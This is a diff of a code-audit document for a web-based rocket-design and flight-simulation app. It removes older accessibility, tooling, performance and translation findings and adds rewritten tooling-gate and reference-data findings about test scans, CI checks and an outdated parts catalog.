-- **A17** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/SimulationsTable.tsx:191-199`. The warning count "⚠ N" exposes the warning texts only through `title` on a non-focusable span. *Why it matters:* Keyboard and touch users cannot read which warnings fired from the table. *Fix:* Make it a button that opens Results, or add sr-only text and aria-describedby. |.
-- **A18** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/AboutDialog.tsx:190`. The 🚀 decorative emoji is not aria-hidden. *Why it matters:* Screen readers announce "rocket" before the tagline. *Fix:* Add aria-hidden. |.
-- **A19** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/FlightPath3D.tsx:386-408`. The playback scrub `<input type="range">` and the speed `<select>` have no aria-label and no label element. The 3D path view needs WebGL, so the axe e2e scan never reaches it *Why it matters:* A screen reader announces an unnamed slider and an unnamed combobox (axe `label` / `select-name`) *Fix:* Add `aria-label={t(...)}` to both (en.json already has `flight` keys and a "speed" key at line 590) |.
-- **A20** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/UpdateCheckDialog.tsx:344-368 (state/updateStore.ts:62-75)`. `result` persists between openings. The first paint of a reopened dialog shows the previous answer, for example "up to date", and its live region announces it before the effect sets `checking`. *Why it matters:* Users are told a stale answer as if it were the current check. *Fix:* Set `result: 'checking'` when the menu opens the dialog, or reset it on mount before paint.
-- **A21** (LOW, CONFIRMED BY REVIEWER) `web/src/components/report/ExportDialog.tsx:418-441`. A single `<label>` wraps both the fill checkbox and the `ColorInput`. This is the pattern the previous audit fixed in AppearanceSection and SettingsDialog ("a label may only bind to one"), and it has come back here. *Why it matters:* The color input has no accessible name, and clicking the "Fill" word toggles the checkbox. *Fix:* Make it a row with a label bound to the checkbox and an `aria-label` on the ColorInput.
-- **A22** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/SettingsDialog.tsx:558-561`. Every part-color reset button has the same aria-label (t('settings.resetOne')). *Why it matters:* In a list of part colors, the screen reader hears "Reset" repeatedly with no part named. *Fix:* Include the label, e.g. t('settings.resetOneFor', { name: label }). |.
-- **A23** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/TabBar.tsx:241-243`. The active tab differs visually only by text color, and the emoji span is not aria-hidden, so the name reads "rocket Rocket". *Why it matters:* Low-vision users cannot see which tab is current (WCAG 1.4.1). The screen reader name is noisy. *Fix:* Add a non-color indicator (underline/weight) and aria-hidden on the icon span. |.
-- **A24** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/SimulationsPane.tsx:127`. The export button's content is "⬇ CSV", so its accessible name is the arrow glyph plus CSV. The descriptive text is only in `title`. *Why it matters:* Screen readers announce "down arrow CSV" instead of "Export run table". *Fix:* Add aria-label={t('sims.exportRunTable')} and aria-hidden on the glyph. |.
-- **A25** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/Rocket3D.tsx:160-175`. The Side and Aft preset buttons show which one is active by background color only (`presetStyle`); there is no `aria-pressed`. The Cutaway button beside them has it *Why it matters:* Color-only state *Fix:* Add `aria-pressed={preset==='side'}` / `'aft'` |.
-- **A26** (LOW, REPORTED) `web/src/components/canvas/TreeSchematic.tsx:408-411, AftView.tsx:446-453`. No `onPointerCancel` handler. A touch cancel (OS gesture or scroll takeover) leaves `pan.current` / `rollDrag.current` armed, so the next pointermove keeps panning or rolling without a press *Why it matters:* A sticky drag on touch devices *Fix:* Route `onPointerCancel` to the same end handler |.
-- **A27** (LOW, CONFIRMED BY REVIEWER) `web/src/components/config/configColumns.tsx:27-29 (used at 73, 98, 110)`. `Overridden` marks a configuration's own value with color alone (`text-warn-300`). The delays print raw (`+${delay}s`, lines 49, 74, 109) with no `fmtNum`. *Why it matters:* The table's override cue reaches no screen-reader or color-blind user (the editor card has a text badge, the table has none), and a delay prints with a "." decimal in every locale. *Fix:* Add an sr-only "(overridden)" or a glyph, and format the delays with `fmtNum`.
-- **A28** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/TabBar.tsx:73; web/src/components/layout/AppHeader.tsx:57`. Decorative emoji spans are not `aria-hidden`. *Why it matters:* Each bottom tab announces as "rocket Rocket", "triangular ruler Sketch", and so on, and the header reads "rocket" before the app name. *Fix:* Add `aria-hidden="true"` to the icon spans.
-- **A29** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/DesignLibraryDialog.tsx:113-124`. Every row's Rename and Delete buttons are named only "Rename"/"Delete". *Why it matters:* A screen-reader user tabbing through the list hears identical controls with nothing saying which design they act on. *Fix:* Use `aria-label={t('library.renameNamed', { name })}` (and the same for delete).
+## 🟠 Tooling and gates
 
-## 🟠 Architecture, tooling, tests and performance
+**T1. MED, FIXED | Native `<details>` popups are not on the popup list** | `web/tests/popupSurfaces.test.ts:17, 50`; `web/e2e/a11y.spec.ts:666-673` | VERIFIED
+The list counts `aria-expanded=` only, so `CheckMenu` (`CheckMenu.tsx:61`,
+behind the motor picker and dashboard filters and columns) and the Off the
+rail details (`OffTheRail.tsx:236`) are never opened in a scan. Popups also
+lack the "scans at least surfaces" check dialogs have: `ComponentTree` lists 2
+and has 1 scan, and the row fold (`ComponentTree.tsx:204`) is never scanned.
+Fix: count `<details`, add the scans, add the count check.
+Resolution: `popupSurfaces.test.ts` counts `<details>` as well as
+`aria-expanded` (outside block comments), so `CheckMenu` and `OffTheRail` are
+on the list. `a11y.spec.ts` scans the dashboard columns, the motor
+manufacturers, Off the rail's forecast and a folded tree row, and fails to load
+when a component renders more popups than it has scans.
 
-### Medium
+**T2. MED, FIXED | The engine banner, update banner and view fallback are never scanned** | `web/e2e/a11y.spec.ts:687-701`, `web/e2e/base.ts:206-220` | VERIFIED
+Every scan waits for the engine, so `EngineNotice` (loading, stalled, failed),
+`UpdateToast` (`UpdateToast.tsx:282`) and `ErrorBoundary`'s fallback
+(`ErrorBoundary.tsx:51`) are never on screen under axe, in any theme. Fix:
+force each state and scan it.
+Resolution: `a11y.spec.ts` has boot scans that load the page themselves: the
+engine banner loading (download held open), slow (the retry offered) and
+failed (download refused); the update banner (a newer worker registered under
+a new script URL, since a same-URL update check passes no route); and the view
+fallback (the 3D view's chunk refused). The update banner scan found the reload
+button at 2.7:1 and the build line at 4.3:1 in light; both now use the shared
+primary button and the plain accent text.
 
-- **T1** (MED, tests, CONFIRMED BY REVIEWER) `web/tests/services/design/autoRadius.test.ts, discGeometry.test.ts`. Auto radius resolution (autoRadius.ts, discGeometry.ts `tubeRadii`/`mountBore`/`discDims`) is asserted only against hand literals, never against the kernel. That is why the four divergences above pass. *Why it matters:* Ported kernel math without a kernel oracle is the failure mode AUDIT_PROMPT names. *Fix:* Add an autoRadius.kernel test on the finPlanform.kernel.test.ts pattern: build through the engine and compare against the kernel's resolved radii (multistage, auto chain, ring in a cone, two inner tubes). |.
-- **T2** (MED, performance, REPORTED) `web/src/components/sim/SimulationsPane.tsx:52`. The `staleCount` selector calls `selectOutdated` -> `resultKey` for every sim on every store update. resultKey (services/flight/simulations.ts:156-161) does `stableJson` of the cached tree-key string plus the config (motor specs with thrust/mass arrays) and the launch. *Why it matters:* With many simulations, every keystroke in the launch fields re-serializes N large blobs. SimulationsTable recomputes the same per row. *Fix:* Memoize resultKey per (sim, tree, config, prefs) identity in a WeakMap, or derive staleness once in a memoized selector shared by the pane and the table. |.
-### Low
+**T3. MED, FIXED | The Help and Safety scans can pass on the loading placeholder** | `web/e2e/a11y.spec.ts:331-334`, `web/src/components/layout/HelpPageFrame.tsx:44-58` | VERIFIED code, REPORTED timing
+They wait only for the dialog; the docs frame is `opacity-0` until ready, and
+with `public/docs` missing the scan passes on `help.missing`. There is no CI
+precondition like `help-dialog.spec.ts:33-41`, and Safety is never scanned
+loaded. Fix: wait for the frame's ready state; fail under `CI` without
+`public/docs/index.html`.
+Seen failing: in a full `npx playwright test` run on 2026-10-13 the dark theme
+"Popup / help contents" scan reported a link in the docs frame at 2.3:1
+(#817043 on #4d3800), colors of the frame partway through its fade; the same
+scan passed 8 of 8 runs alone and in two other full runs. The next full run
+failed the same way on the "Help" scan, same element and same colors, so the
+frame passes through one state that fails, and a scan that does not wait for
+it settled lands there under load. A scan that reads a frame before it
+settles fails at random as well as passing on a placeholder.
+Resolution: the Help, Safety and help contents scans open through `helpOpen`,
+which waits for the frame to lose `opacity-0` and for the docs page's finite
+animations to finish, and throws under `CI` when `public/docs/index.html` is
+missing. 36 of 36 repeated runs pass.
 
-- **T3** (LOW, tooling, CONFIRMED BY REVIEWER) `web/tsconfig.node.json:24`. `include` lists `eslint.config.js`, but neither this file nor the base tsconfig sets `allowJs`/`checkJs`, so tsc drops it without a warning. `npx tsc -p tsconfig.node.json --listFilesOnly` lists only vite.config.ts, vitest.config.ts and playwright.config.ts. The header comment (lines 2-12) still claims eslint.config.js is typechecked. It also says tsconfig.json is `include:["src"]` (it is `["src","tests"]`) and that `npm run typecheck` is "exactly those two" (package.json runs three). gates.yml:330 repeats "the config files". *Why it matters:* This is a gate whose stated scope is wider than what it checks: a type error in eslint.config.js is caught by nothing, while the comments say it is covered. *Fix:* Either add `"allowJs": true, "checkJs": true` (and fix what that surfaces) or remove eslint.config.js from the include. Rewrite the header to describe the current three-project layout.
-- **T4** (LOW, tooling, CONFIRMED BY REVIEWER) `.github/workflows/gates.yml:498-506`. The docs-build comment in the `update-flow` job is copied from an older e2e job. It says the step exists because help-dialog.spec.ts would skip, and that it is "Paid once per shard". This job has no shards and runs no Playwright suite: it runs e2e:update, e2e:offline-data and e2e:offline-help (lines 526-534), and the docs build is there for offline-help. The same mix-up appears at web/e2e/help-dialog.spec.ts:38, whose CI error says "The e2e and update-flow jobs run `npm run docs:build`". The gates.yml `e2e` job (lines 407-447) has no docs step; the job that does is e2e-full.yml. *Why it matters:* When help-dialog fails in e2e-full, the error sends the reader to the wrong job. A maintainer trimming update-flow could also judge the docs step dead, since no help spec runs there, and drop it. That would turn offline-help red, or hollow it out. *Fix:* Reword gates.yml:498-506 to "offline-help needs the built docs". Change the help-dialog.spec.ts message to name e2e-full.yml.
-- **T5** (LOW, tooling, CONFIRMED BY REVIEWER) `.github/workflows/dev.yml:23 and gates.yml:313`. dev.yml:23 says "Only the web gates: `npm run verify`", but line 77 runs `verify:ci`. gates.yml:313 says "ONE list, `verify` in web/package.json", but the shared list is `gates`; `verify` and `verify:ci` are two endings on it. *Why it matters:* Someone who edits `verify` to add a gate will expect CI to pick it up. It will not, because CI runs `gates` + `test:coverage`. *Fix:* Name `gates` as the single list in both comments.
-- **T6** (LOW, tooling, CONFIRMED BY REVIEWER) `web/tests/engine/engineBoundary.wasm.test.ts:36, tests/engine/motorSimilarity.kernel.test.ts:11, tests/services/design/canHost.kernel.test.ts:19, tests/services/motors/catalogMotors.kernel.test.ts:21, tests/services/parts/catalogPatch.kernel.test.ts:21, tests/tree/kernelDefaults.kernel.test.ts:26`. Six whole-file `/* eslint-disable @typescript-eslint/no-explicit-any */` comments with no `--` reason. Every other disable in src, tests and e2e states one. The config already disables the `no-unsafe-*` family for tests, citing untyped kernel JSON envelopes, which is the same reason. *Why it matters:* A file-wide disable with no reason hides any new `any` in those files, and nothing says why it is allowed. *Fix:* Move `no-explicit-any: 'off'` into the tests block of eslint.config.js beside the `no-unsafe-*` entries, with the envelope reason, and delete the six comments. Otherwise add `-- <reason>` to each.
-- **T7** (LOW, tooling, CONFIRMED BY REVIEWER) `.gitignore:15 (repo root, outside web/ but cited by web/.prettierignore)`. The comment says "(see deploy-pages.yml)". No such workflow exists; it is deploy.yml. Lines 43-44 are also history ("three build artifacts were tracked because..."). *Why it matters:* A dangling reference sends the reader to a file that does not exist. *Fix:* Change it to deploy.yml and keep only the constraint.
-- **T8** (LOW, performance, REPORTED) `web/src/components/canvas/sceneColors.ts:395-404,419-420`. `useSyncExternalStore`'s `getSnapshot` runs `getComputedStyle(documentElement)` plus 17 `getPropertyValue` calls on every render of every subscriber (Rocket3D, RocketModel, StabilityCallout, FlightPath3D, the latter at about 10 Hz during playback) *Why it matters:* A forced style resolution per render in the hot playback path *Fix:* Cache the snapshot and recompute only inside the subscribe callback (on a MutationObserver or matchMedia change) |.
-- **T9** (LOW, tests, CONFIRMED BY REVIEWER) `web/tests/engine/atmosphereProfile.test.ts:120-140`. The engine-backed density check (`rhoAtLiftoff` against airDensity) covers only forecast levels and plain ISA. The custom ExtendedISAModel branch has no engine comparison: temperature, pressure or humidity set, with blanks filled from the standard constants. That is the branch just rewritten. It is pinned only by hand numbers and a regex over OpenRocketEngine.java (recoverySizing.test.ts:165-189). The anchored-levels case (site T and P plus levels) also has no engine comparison. *Why it matters:* A future bridge or kernel change to the custom branch at a non-zero altitude would pass the regex and still desync the panel. *Fix:* Add `rhoAtLiftoff(2682, undefined, {temperature: 303.15})`, the same with pressure only, and anchored levels, each compared to airDensity. |.
-- **T10** (LOW, architecture, CONFIRMED BY REVIEWER) `web/src/state/fileSlice.ts:24-35`. fileSlice imports runtime values from './store', and store.ts calls `createFileSlice` while the module loads (store.ts:916). *Why it matters:* Any module or test that imports fileSlice before store hits a TDZ ReferenceError on `createFileSlice`. The header comment states only half of this constraint. *Fix:* Move `configOf`, `defaultConfig`, `displayUnits`, `repairNotes`, `saveFailure`, the selectors and `workspaceSnapshot` into a leaf module, so fileSlice's edge to store is type-only.
-- **T11** (LOW, architecture, CONFIRMED BY REVIEWER) `web/src/state/store.ts:460-471,1489`. `runSim`, `runSims`, `runOutdated` and `runDriftSweep` take a `prefs` argument, although the store mirrors the same value as `simPrefs` and keys outdatedness on it. `runDriftSweep` also re-implements `effectivePrefs` inline. *Why it matters:* Two sources of truth for the result key. A caller passing anything other than `settings.simulation` produces a result that reads outdated at once, which re-fires auto-run. *Fix:* Read `get().simPrefs` inside the actions and drop the parameter. Use `effectivePrefs` in the sweep.
-- **T12** (LOW, performance, REPORTED) `web/src/components/design/FreeformFinActions.tsx:55-62`. The full-resolution bitmap is drawn to a same-size canvas and read with getImageData before finImage downscales (MAX_TRACE_EDGE). The bitmap is never closed. *Why it matters:* A 48 MP phone photo exceeds Safari's canvas area limit and reports "image unreadable" for a valid photo. Large photos allocate hundreds of MB. *Fix:* Pass resizeWidth/resizeHeight to createImageBitmap (cap at MAX_TRACE_EDGE) and call bitmap.close(). |.
-- **T13** (LOW, performance, CONFIRMED BY REVIEWER) `web/src/components/layout/SettingsDialog.tsx:444-455`. Settings > Launch mounts `LaunchPanel`, whose fields are live `NumberInput`s, and every keystroke calls `update()`, which runs `saveSettings` synchronously (SettingsProvider.tsx:54-58). Its own `NumField` uses `commitOnBlur` precisely because "a settings write hits storage". *Why it matters:* Typing an altitude or pressure does a localStorage write and a provider re-render per key, and intermediate prefixes are persisted as the defaults for new simulations. *Fix:* Buffer the launch defaults locally and write on blur, or give `QNum`/`NumberRow` a `commitOnBlur` pass-through.
-- **T14** (LOW, tests, CONFIRMED BY REVIEWER) `tests/services/design/autoRadius.test.ts:212-226`. The tube-fin auto test asserts only `> 0` and `< 0.026`. The closed form for 6 tubes on a 26 mm body is 0.026 * sin(pi/6) / (1 - sin(pi/6)) = 0.026. The assertion passes only because floating-point noise lands a hair under 0.026, so it pins nothing, and nothing tests re-resolution after an edit (which is how the HIGH above slipped through). *Why it matters:* This is the "endpoints and bounds only" test pattern the audit prompt warns about. *Fix:* Assert the closed form with toBeCloseTo, and add body-radius and fin-count change cases.
+**T4. MED, FIXED | `scriptsReferenced` counts a script naming itself** | `web/tests/scriptsReferenced.test.ts:174-189` | VERIFIED
+The haystack includes each script's own file. `gen-icons.mjs:2`,
+`sync-components.mjs:23`, `sync-examples.mjs:11`, `sync-motors.mjs:8`,
+`sync-contributors.mjs:15`, `sync-materials.mjs:7` and `lib/dataManifest.mjs`
+name themselves by path, so the gate stays green if they lose every caller.
+None is orphaned today. Fix: build the haystack without the script's own
+file.
+Resolution: `orphansIn` skips a script's own file as a caller, and a test
+shows `gen-icons.mjs` and `lib/dataManifest.mjs`, which name themselves, are
+orphans when only their own text is read.
 
-## 🟡 Conventions
+**T5. MED, FIXED | Which CI check guards master is not stated** | `.github/workflows/dev.yml:40-57`, `ci.yml:3-6`, `docs/DEVELOPER.md:190` | REPORTED (branch protection not visible)
+The only required check named is `Dev / verify`, from a push to a branch in
+this repository. If the pull request run is not required, a failing merge
+result reaches master and Pages; a pull request from a fork can never get
+`Dev / verify`. Fix: a `verify` aggregator in `ci.yml` and require it.
+Resolution: `ci.yml` has a `verify` job like `dev.yml`'s, so a pull request
+reports one check that fails when any gate fails, a fork's included.
+`ciTriggers.test.ts` fails if either `verify` job stops running after a failed
+gate or stops failing with it. Making it a required check is not planned.
 
-### Medium
+## 🟠 Reference data
 
-- **K1** (MED, CONFIRMED BY REVIEWER) `web/src/services/design/componentFields.ts:136`. `DEPLOY_EVENTS` omits `lower_stage_separation`, which the kernel enum has (DeploymentConfiguration.LOWER_STAGE_SEPARATION) and the bridge accepts (ComponentFactory.java:863). Desktop's recovery dialog offers it. *Why it matters:* A .ork that deploys a chute at lower-stage separation imports and flies correctly, but the Deploy-event select has no option for its value and cannot set it on a new design. The desktop UI is the spec. *Fix:* Add `'lower_stage_separation'` and its i18n key (en.json `deployEvent.*`, plus the Spanish twin).
-### Low
+**R1. HIGH | The published parts catalog comes from an older pipeline** | `.github/workflows/sync-catalogs.yml:26-29` (master's copy runs the schedule) | VERIFIED
+Scheduled runs use master's workflow, which checks out
+`dbcook/openrocket-database@772db251` instead of the
+`openrocket/openrocket-database@1512874a` OpenRocket 24.12 pins, and has no
+`check:digests`, no entity decoding and no parachute fields. The `data`
+branch (30104dbe) serves 5231 parts: 123 without a digest (113 LOC Precision,
+4 Rocketarium, 3 LOC, 2 BalsaMachining, 1 Maadcow), 4 rail buttons desktop
+24.12 does not have, 3 digests on two rows each, 23 descriptions with a raw
+`&gt;`, no parachute line or packed fields, and a manifest that still names
+materials and contributors. The committed copy is correct: 5228 rows,
+per-type counts equal to `PresetDump` for 24.12, every digest 1:1.
+Fix: once this pipeline is on master, dispatch Sync Catalogs; add a `push`
+trigger on master for `web/scripts/**`, the pin file and the workflow.
 
-- **K2** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/HeaderDialogs.tsx:76-81`. The comment is change history and a postmortem ("Every one of these used to be mounted… That is what let MotorDashboard fetch the 1.6 MB motor catalog… despite its own comment"). *Why it matters:* It violates the house rule that comments state the present-tense constraint. *Fix:* Replace with: "Mounted only while open: a closed dialog must run no effects (MotorDashboard would fetch the motor catalog) and keep no state." |.
-- **K3** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/FlightChart.tsx:192; web/src/components/sim/SimSummary.tsx:240,303,324`. User-facing literals bypass i18n: "⬇ CSV" (the button's accessible name, while its title says "Download flight data (.csv)"), "CP", "Mach", "kPa·°". *Why it matters:* Untranslated in the es locale. The CSV button's spoken name is "downwards arrow CSV". *Fix:* Move to en.json/es.json keys. Give the CSV button aria-label={t('flight.exportCsv')}. |.
-- **K4** (LOW, CONFIRMED BY REVIEWER) `.github/workflows/gates.yml:11-22, 62-74, 121-132, 144-145, 176-177, 182-190, 196-200, 253-254, 314-316, 319-329, 348-349, 386-391, 499-502`. These comments are change history and postmortems, not constraints. Examples: "The web jobs used to wait for parity", "This step was instrumented for one run ... run 35267658288 ... four guesses had failed", "parity.mjs used to load the targets into itself", "It had: a regeneration produced a tree that did not compile", "Those used to sit burning runner minutes", "This job used to spell the steps out", "Coverage used to be emitted and seen by nobody", "SKIPPED -- on every CI run there had ever been". Line 189 also cites a ticket tag ("the mistake T9 records"). *Why it matters:* The house rule is present-tense constraints with no history or ticket tags. These blocks bury the live hazard (for example "the WASM-GC process cannot exit, so targets run in a killable child") under narrative, and T9 points at nothing in the repo. *Fix:* Cut each block down to the constraint it protects and drop the T9 reference.
-- **K5** (LOW, CONFIRMED BY REVIEWER) `.github/workflows/dev.yml:5-13, 48-52, 57-61; ci.yml:6-7; deploy.yml:39-41, 69-72; sync-catalogs.yml:50-51, 178-182`. More change history. Examples: "it is the second attempt at it. The first read `branches: [dev]` ... Naming the branch was the bug"; "no longer runs only on `dev`"; "15, raised from 10 when this job moved to `verify:ci`"; "this file no longer needs the `guard` job it used to carry"; "Uncapped it inherited the 360-minute default"; "Row-key collisions are NOT reported here any more". *Why it matters:* Same rule as above. *Fix:* Keep the constraint and remove the history. For example, dev.yml:48-52 becomes "the name stays `Dev` because branch protection requires `Dev / verify`".
-- **K6** (LOW, CONFIRMED BY REVIEWER) `web/.prettierignore:9-15; web/tsconfig.e2e.json:2-8; web/tsconfig.node.json:2-12`. .prettierignore: "which this comment used to claim of all five ... Saying it was committed sent a reader looking for files that are not in the repo." tsconfig.e2e.json: "They were invisible to `tsc --noEmit` ... sat in the specs while the build reported clean", "`@types/node` is a devDependency now". tsconfig.node.json: "were in no tsc project at all ... surfaced only at runtime". *Why it matters:* These are postmortems in the tooling files. In tsconfig.node.json the narrative is also factually stale (see the TOOLING finding above). *Fix:* Keep only the constraint, for example "public/docs is built, gitignored, and not formatted".
-- **K7** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/SchematicControls.tsx:287`. `onError?.(\`SVG export failed: ${errorMessage(e)}\`)` is a hardcoded English user-facing string. The image path right below it uses `t('export.imageFailed', ...)` *Why it matters:* Non-English users get English in the error note *Fix:* Add an `export.svgFailed` key |.
-- **K8** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/ImageExportMenu.tsx:179`. `title={\`${w} px wide\`}` is an English literal *Why it matters:* Tooltip is not translated *Fix:* Add an i18n key with interpolation |.
-- **K9** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/EnvironmentView.tsx:389`. The profile chart's `aria-label` is assembled as `` `${title}: ${loUi} to ${hiUi} ${xSym}, ground to ${...}` ``, with English "to" and "ground to" as literals *Why it matters:* The screen-reader description of every environment chart is half English in the other nine locales *Fix:* Move to an `env.chartAria` key with interpolation |.
-- **K10** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/schematicShapes.tsx:557-568`. The in-drawing type tags 'chute', 'strmr', 'cord', 'mass', 'CR', 'BH', 'EB', 'TC', 'IT' are English literals, rendered as text (line 713) and carried into the SVG/PNG export *Why it matters:* Visible drawing text is not translated *Fix:* Pull the tags from en.json (for example `schematic.tag.<type>`) |.
-- **K11** (LOW, REPORTED) `web/src/components/canvas/aeroTables.ts:50-56 (used at :109,:160,:188)`. `niceName` shows the kernel's component name, or its CamelCase class split into words ("Body Tube"). Unnamed parts therefore appear in the Per component tables with the kernel's English default name, while the tree, AftView (`partLabel`) and TreeSchematic (`part.<type>`) show the translated type name *Why it matters:* Same part, different names in different panes; English in the Spanish UI *Fix:* Map rows back to tree nodes by key and use `partLabel(t, node)` when the user never named the part |.
-- **K12** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/TreeSchematic.tsx:500-504`. The comment says "Vertical is read-mostly ... the whole strip hides rather than export a sideways page", but vertical mode was deleted (docs/AUDIT.md:1305, FIXED 2026-10-03). `controls &&` is always truthy JSX *Why it matters:* A stale comment describes behavior that does not exist, plus a dead guard *Fix:* Delete the comment and the `controls &&` guard |.
-- **K13** (LOW, REPORTED) `web/src/components/canvas/rocketPieces.ts:455-456 and schematicShapes.tsx:818-819`. The transition fore/aft radius fallbacks `0.012`/`0.009` are literals outside `KERNEL_DEFAULTS` (whose `transition` row has only length and thickness). ComponentFactory.java case "transition" (lines 210-221) treats an absent radius as automatic, falling back to SymmetricComponent.DEFAULT_RADIUS 0.025, not 12/9 mm *Why it matters:* The literals drift from the kernel and escape the KERNEL_DEFAULTS guard test. Reachable only if a radius key is missing, because autoRadius stores the resolved radii *Fix:* Route these through KERNEL_DEFAULTS (and solidMesh.ts:466, outside this slice) |.
-- **K14** (LOW, CONFIRMED BY REVIEWER) `web/src/services/flight/recoverySizing.ts:86 and :128-130`. Line 86 says "The second branch only differs away from sea level", but the blank-fill branch is the third one listed. Lines 128-130 say the kernel table is "every 500 m (geopotential altitude)". InterpolatingAtmosphericModel.computeLayers samples getExactConditions(i*500) at geometric altitude, and the code (isaExact(i*500)) does the same. *Why it matters:* The code matches the kernel, but the doc misdescribes it, which is how the next port drifts. *Fix:* Fix both sentences.
-- **K15** (LOW, CONFIRMED BY REVIEWER) `web/src/services/exports/solidMesh.ts:420-429`. The TUBE_FIN_WALL comment says "ComponentFactory never calls setThickness for a tube fin set". ComponentFactory.applyWallThickness (lines 930-933) does call it whenever the node carries `thickness`; only an absent key leaves TubeFinSet.thickness NaN. *Why it matters:* Anyone checking the export against the kernel is sent the wrong way. *Fix:* Reword: "sets it only when the node carries thickness; absent, the kernel keeps NaN". |.
-- **K16** (LOW, CONFIRMED BY REVIEWER) `web/src/services/exports/solidMesh.ts:419-429`. The comment says "ComponentFactory never calls setThickness for a tube fin set". It does when the key is present: ComponentFactory.applyWallThickness (ComponentFactory.java:930-933). The fallback itself is right, because an absent key leaves TubeFinSet.thickness at NaN. *Why it matters:* The comment states a false constraint, and the next reader may "fix" the export to ignore the user's tube-fin wall. *Fix:* Reword: "absent a thickness key the kernel keeps TubeFinSet.thickness = NaN".
-- **K17** (LOW, REPORTED) `web/src/services/flight/runnability.ts:140`. The design-blocker list is joined with literal English punctuation outside i18n.
-- **K18** (LOW, CONFIRMED BY REVIEWER) `web/src/services/design/treeEdit.ts:854; defaultRocket.ts:366`. English stage names are stored as literals: 'Booster' and `Stage ${n}` in addStage, 'Sustainer' in the default design. They have drifted from orkTree.ts:26 `defaultStageName` (the third stage is "Booster 2" there and "Stage 3" here). *Why it matters:* Non-English users get English stage names, and the two naming schemes disagree. *Fix:* Name stages through `defaultStageName` and route it through i18n, or leave them unnamed and label at render. |.
-- **K19** (LOW, CONFIRMED BY REVIEWER) `web/src/state/fileSlice.ts:67-68`. The comment says "The `void`-calling sites in AppHeader keep their `void`", but AppHeader now routes every one through `fireAction` (AppHeader.tsx:31,97,107-110). *Why it matters:* The comment states something that is no longer true. *Fix:* Reword it to name `fireAction`.
-- **K20** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/SimEditor.tsx:240,244; web/src/components/layout/SettingsDialog.tsx:346-347; web/src/components/report/ExportDialog.tsx:457-458; web/src/components/sim/WeatherDialog.tsx:177`. Literal user-facing strings: "Extended Barrowman" and "6-DOF Runge-Kutta 4" (duplicated in two files), "Letter"/"A4", and hardcoded " mi"/" km" units chosen by sniffing `u.sym('distance')`. *Why it matters:* Untranslated text beside translated labels. The visibility unit bypasses the units system the earlier SiteMap scale fix moved to. *Fix:* Move them to en.json keys, and format visibility through a units quantity.
-- **K21** (LOW, CONFIRMED BY REVIEWER) `web/src/components/report/ExportDialog.tsx:457-458`. The paper options "Letter" and "A4" are literals. *Why it matters:* "Letter" is a translatable word (es "Carta"). *Fix:* Use i18n keys. |.
-- **K22** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/RangeSlider.tsx:64,75`. The accessible names are built as `${label} min` / `${label} max` in English. *Why it matters:* Spanish screen readers hear English. *Fix:* Use t('motorDlg.min') / t('motorDlg.max'), which already exist. |.
-- **K23** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/MotorDialog.tsx:374-382 and web/src/components/design/MaterialPicker.tsx:224-230`. One-click ✕ permanently deletes an imported motor or a custom material. ComponentPicker.tsx:417-428 confirms the equivalent saved-part delete and states the reason ("can be the only copy"). *Why it matters:* Imported curves and custom materials are just as unrecoverable, and the motor ✕ sits beside the row that selects it. *Fix:* Route both through `confirm({ danger: true })`.
-- **K24** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/PaneSplitter.tsx:75-76`. The comment says the cap is read "at the moment of the gesture... no resize listener", but lines 8-12 and 77 subscribe to window resize. *Why it matters:* The comment contradicts the code beside it. *Fix:* Reword to state that clamp reads live and the subscription only drives aria-valuemax. |.
-- **K25** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/SchematicControls.tsx:82`. `onError?.(\`SVG export failed: ${...}\`)` is an English literal. The image path right below it uses `t('export.imageFailed', ...)` *Why it matters:* Untranslated user-facing error *Fix:* Use an i18n key |.
-- **K26** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/EnvironmentView.tsx:192`. The chart aria-label is assembled with English literals (`"... to ... , ground to ..."`) *Why it matters:* Screen-reader text is untranslated *Fix:* Use a t() template |.
-- **K27** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/ImageExportMenu.tsx:317`. `title={\`${w} px wide\`}` is an English literal *Why it matters:* Untranslated tooltip *Fix:* i18n key |.
-- **K28** (LOW, CONFIRMED BY REVIEWER) `web/src/services/files/orkImport.ts:146,165-199`. The new user-facing import notes (`versionNotes`, the extension, decal and doc-level notes) are English literals in a service, not i18n keys. This is consistent with the rest of `ork/importNotes.ts` and `loadOrk.ts`, so the gap is systemic: an es user sees English banners. *Why it matters:* It breaks the i18n house rule. *Fix:* Move the import notes to keyed messages that the banner translates, as `importBanner.importNotes` already does for limits.
-- **K29** (LOW, REPORTED) `web/src/components/layout/DesignLibraryDialog.tsx:98,140`. `void openDesign(...)` and `void renameDesign(...)` are used where `state/fireAction.ts` says `void` "would satisfy the rule and keep the hazard". `openDesign` awaits `lib.read` with no try/catch (fileSlice.ts:329). *Why it matters:* An IndexedDB rejection closes the dialog and opens nothing, silently. *Fix:* Use `fireAction(...)`.
+**R2. MED, FIXED | The app prefers the data host's catalog even when it is older** | `web/src/services/app/remoteData.ts:49, 244-253` | VERIFIED
+Resolution: the data host is the only source of the motors and components in
+a build that has one, so there is no older copy to prefer or fall back to.
+`vite.config.ts` leaves the build's own copy of the two out of the output and
+the precache; offline, the service worker answers from its cached download
+(`astra-catalogs`), which `services/app/warmCatalogs.ts` fetches in the
+background on the first visit. Pinned by `tests/services/app/remoteData.test.ts`
